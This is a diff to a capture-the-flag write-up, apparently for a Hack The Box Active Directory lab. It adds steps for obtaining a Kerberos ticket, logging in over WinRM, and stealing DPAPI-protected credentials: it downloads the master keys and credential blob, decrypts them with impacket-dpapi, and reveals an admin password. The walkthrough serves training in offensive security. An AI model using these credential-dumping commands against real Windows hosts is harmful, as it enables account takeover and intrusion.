@@ -629,9 +629,14 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Valid user => L.Bianchi_adm
 ```
 
-`kerbrute` has already saved TGT in `C.Neri.ccache`, let's go ahead and use it:
+Let's connect with `C.Neri`:
 
 ```console
+root@kali:~# impacket-getTGT vintage.htb/C.Neri:Zer0the0ne -dc-ip dc01.vintage.htb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in C.Neri.ccache
+
 root@kali:~# export KRB5CCNAME=C.Neri.ccache
 
 root@kali:~# evil-winrm -i dc01.vintage.htb -r vintage.htb
@@ -691,8 +696,195 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 Get the `user.txt`
 
 ```pwsh
-PS C:\Users\C.Neri\Documents> hostname
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> hostname
 dc01
-PS C:\Users\C.Neri\Documents> type ..\Desktop\user.txt
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> type ..\Desktop\user.txt
 8a6d2f23df458774f9168aa764aaa2e6
+```
+
+## 4. Lateral Movement (to accounts with privileges)
+
+### 4.0. [DPAPI secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)
+
+DPAPI (Data Protection API) is an internal component in the Windows system which allows various applications to store sensitive data (e.g. passwords)
+
+The data are stored in the users directory and are secured by **user-specific master keys derived from the users password**, usually at:
+
+```cmd
+C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
+```
+
+- Application like Google Chrome, Outlook, Internet Explorer, Skype use the DPAPI
+- Windows also uses that API for sensitive information like Wi-Fi passwords, certificates, RDP connection passwords, and many more
+
+The secrets that are encrypted using the key are then stored in credentials folders, usually at:
+
+```cmd
+C:\Users\$USER\AppData\Local\Microsoft\Credentials\
+C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
+```
+
+### 4.1. Moving to `C.Neri_adm`
+
+#### 4.1.1. Searching for credential files
+
+Let's check if `C.Neri` has any DPAPI credentials
+
+> [!Tip]
+>
+> Credentials folder is hidden, show hidden files/folders with:
+> - `dir /A $PATH` or
+> - `Get-ChildItem -Force $PATH`
+
+```pwsh
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> Get-ChildItem -Force  C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\
+
+
+    Directory: C:\Users\C.Neri\AppData\Local\Microsoft\Credentials
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          6/7/2024   1:17 PM          11020 DFBE70A7E5CC19A398EBF1B96859CE5D
+
+
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> Get-ChildItem -Force  C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\
+
+
+    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6
+```
+
+Let's check for `C.Neri`'s keys:
+
+```pwsh
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> Get-ChildItem -Force  C:\Users\C.Neri\AppData\Local\Microsoft\Protect
+Cannot find path 'C:\Users\C.Neri\AppData\Local\Microsoft\Protect' because it does not exist.
+At line:1 char:1
++ Get-ChildItem -Force  C:\Users\C.Neri\AppData\Local\Microsoft\Protect
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\C.Neri...crosoft\Protect:String) [Get-ChildItem], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> Get-ChildItem -Force  C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect
+
+
+    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d---s-          6/7/2024   1:17 PM                S-1-5-21-4024337825-2033394866-2055507597-1115
+-a-hs-          6/7/2024   1:17 PM             24 CREDHIST
+-a-hs-          6/7/2024   1:17 PM             76 SYNCHIST
+
+
+*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect> Get-ChildItem -Force  C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115
+
+
+    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
+-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
+-a-hs-          6/7/2024   1:17 PM             24 Preferred
+```
+
+The key for the credential in `\Roaming` is available, let's download the credential and key:
+
+```pwsh
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> cd C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\
+*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> download C4BB96844A5C9DD45D5B6A9859252BA6 /htb/C4BB96844A5C9DD45D5B6A9859252BA6
+
+Info: Downloading C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6 to /htb/C4BB96844A5C9DD45D5B6A9859252BA6
+
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> cd C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115
+*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> download 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 /htb/4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
+
+Info: Downloading C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 to /htb/4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
+
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b /htb/99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+
+Info: Downloading C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b to /htb/99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+
+Info: Download successful!
+```
+
+> [!Note]
+>
+> `evil-winrm`'s download would sometimes have error:
+>
+> ```
+> Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError
+> ```
+>
+> But the file should be already downloaded, check whether is file is present in the destination
+
+#### 4.1.2. Decryting credential file
+
+Decrypt the retrieved key files using `C.Neri`'s password:
+
+```console
+root@kali:~# impacket-dpapi masterkey -file /htb/4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
+
+root@kali:~# impacket-dpapi masterkey -file /htb/99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+```
+
+Decrypt the retrieved credential file using the decrypted key → password of `c.neri_adm` found:
+
+```console
+root@kali:~# impacket-dpapi credential -file /htb/C4BB96844A5C9DD45D5B6A9859252BA6 -key 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+ERROR: Padding is incorrect.
+
+root@kali:~# impacket-dpapi credential -file /htb/C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[CREDENTIAL]
+LastWritten : 2024-06-07 15:08:23
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000001 (CRED_TYPE_GENERIC)
+Target      : LegacyGeneric:target=admin_acc
+Description :
+Unknown     :
+Username    : vintage\c.neri_adm
+Unknown     : Uncr4ck4bl3P4ssW0rd0312
 ```
